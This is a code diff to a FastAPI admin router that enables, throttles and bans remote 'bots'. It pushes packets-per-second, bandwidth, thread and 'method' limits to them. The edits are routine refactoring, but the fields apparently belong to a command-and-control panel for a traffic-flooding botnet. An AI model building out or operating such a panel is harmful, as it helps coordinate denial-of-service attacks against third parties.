@@ -26,9 +26,22 @@ async def toggle_bot(bot_id: UUID, data: BotToggle, admin: User=Depends(get_curr
     if not bot: raise HTTPException(404, "Bot not found")
     if data.enabled:
         await BotService.set_status(bot_id, "online")
-        await manager.send_json(bot_id, {"type":"config_update","throttle":{"max_pps":bot.max_pps,"max_mbps":bot.max_mbps,"max_threads":bot.max_threads,"enabled_methods":bot.enabled_methods}})
+        await manager.send_json(str(bot_id), {
+            "type": "config_update",
+            "max_pps": bot.max_pps,
+            "max_threads": bot.max_threads,
+            "max_mbps": bot.max_mbps,
+            "enabled_methods": bot.enabled_methods,
+            "throttle": {
+                "max_pps": bot.max_pps,
+                "max_mbps": bot.max_mbps,
+                "max_threads": bot.max_threads,
+                "enabled_methods": bot.enabled_methods,
+            },
+        })
     else:
-        await BotService.set_status(bot_id, "offline"); await manager.send_json(bot_id, {"type":"standby"})
+        await BotService.set_status(bot_id, "offline")
+        await manager.send_json(str(bot_id), {"type": "standby"})
     await BotService.log_admin_action(admin.id, "bot.toggle", "bot", bot_id, {"enabled": data.enabled})
     return {"status":"ok"}
 
@@ -36,7 +49,17 @@ async def toggle_bot(bot_id: UUID, data: BotToggle, admin: User=Depends(get_curr
 async def set_throttle(bot_id: UUID, data: BotThrottle, admin: User=Depends(get_current_admin)):
     await BotService.update_throttle(bot_id, data.model_dump(exclude_none=True))
     bot = await BotService.get_bot(bot_id)
-    await manager.send_json(bot_id, {"type":"config_update","throttle":{"max_pps":bot.max_pps,"max_mbps":bot.max_mbps,"max_threads":bot.max_threads,"enabled_methods":bot.enabled_methods}})
+    await manager.send_json(str(bot_id), {
+        "type": "config_update",
+        "max_pps": bot.max_pps if bot else None,
+        "max_threads": bot.max_threads if bot else None,
+        "throttle": {
+            "max_pps": bot.max_pps if bot else None,
+            "max_mbps": bot.max_mbps if bot else None,
+            "max_threads": bot.max_threads if bot else None,
+            "enabled_methods": bot.enabled_methods if bot else None,
+        },
+    })
     await BotService.log_admin_action(admin.id, "bot.throttle", "bot", bot_id, data.model_dump(exclude_none=True))
     return {"status":"ok"}
 
@@ -53,7 +76,7 @@ async def unassign_bot(bot_id: UUID, admin: User=Depends(get_current_admin)):
 
 @router.post("/{bot_id}/ban")
 async def ban_bot(bot_id: UUID, admin: User=Depends(get_current_admin)):
-    await BotService.set_status(bot_id, "banned"); await manager.send_json(bot_id, {"type":"ban"})
+    await BotService.set_status(bot_id, "banned"); await manager.send_json(str(bot_id), {"type":"ban"})
     await BotService.log_admin_action(admin.id, "bot.ban", "bot", bot_id)
     return {"status":"ok"}
 
